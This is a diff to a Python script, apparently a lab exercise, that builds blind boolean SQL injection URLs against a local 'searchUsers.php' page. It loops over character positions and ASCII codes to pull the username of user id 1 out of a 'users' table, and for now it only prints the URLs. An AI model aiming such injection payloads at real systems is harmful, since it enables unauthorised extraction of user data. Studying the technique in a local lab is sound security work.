@@ -141,6 +141,7 @@ import requests
 import signal
 import sys 
 import time
+import string
 from pwn import *
 
 def def_handler(sig, frame):
@@ -150,9 +151,18 @@ def def_handler(sig, frame):
 # Ctrl+c
 signal.signal(signal.SIGINT, def_handler)
 
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
 def makeSQLI():
-	print("\n[+] Hola mundo\n")
-	sys.exit(0);
+
+    for position in range(1,50):
+		for character in range(33,126):
+			sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
+			
+			print(sqli_url)
+	
 
 if __name__ == '__main__':
 
